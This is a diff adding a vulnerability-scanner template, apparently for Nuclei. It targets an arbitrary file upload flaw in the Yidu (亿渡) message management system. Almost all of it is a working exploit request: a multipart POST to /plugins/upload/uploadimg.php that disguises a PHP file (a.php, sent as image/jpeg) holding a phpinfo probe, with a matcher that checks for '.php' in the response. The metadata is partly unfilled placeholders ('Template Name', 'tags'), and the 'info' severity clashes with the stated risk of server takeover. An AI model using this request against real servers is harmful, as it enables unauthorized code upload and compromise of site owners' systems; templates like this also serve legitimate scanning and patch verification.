@@ -1,0 +1,41 @@
+id: yidu-uploadimg-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: info
+  description: 亿渡留言管理系统uploadimg存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E4%BA%BF%E6%B8%A1%E7%95%99%E8%A8%80%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fuploadimg%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /plugins/upload/uploadimg.php?fp=upimg HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 197
+        sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="101"
+        Accept: application/json, text/javascript, */*; q=0.01
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypvPqblfrUine6bl3
+        X-Requested-With: XMLHttpRequest
+        sec-ch-ua-mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+        sec-ch-ua-platform: "Windows"
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: userid=1; PHPSESSID=ov8kb5g3n4gng3lfskbnpbch37; Hm_lvt_448f02fca78a892e6d9c5f1c599ff906=1711623626; Hm_lpvt_448f02fca78a892e6d9c5f1c599ff906=1711623626
+        Connection: close
+
+        ------WebKitFormBoundarypvPqblfrUine6bl3
+        Content-Disposition: form-data; name="file"; filename="a.php"
+        Content-Type: image/jpeg
+
+        <?php phpinfo();?>
+        ------WebKitFormBoundarypvPqblfrUine6bl3--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.php'
